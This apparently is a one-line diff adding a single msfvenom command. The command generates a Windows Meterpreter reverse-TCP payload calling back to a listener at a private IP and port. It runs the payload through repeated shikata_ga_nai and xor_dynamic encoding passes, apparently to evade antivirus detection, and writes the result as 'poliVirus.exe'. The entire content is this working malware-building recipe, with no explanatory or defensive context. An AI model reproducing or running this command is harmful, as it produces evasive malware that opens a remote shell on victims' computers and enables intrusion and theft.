@@ -1,0 +1,1 @@
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.217 LPORT=5959 -a x86 --platform windows -e x86/shikata_ga_nai -i 200 -f raw | msfvenom -a x86 --platform windows -e x86/xor_dynamic -i 200 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 200 -o poliVirus.exe
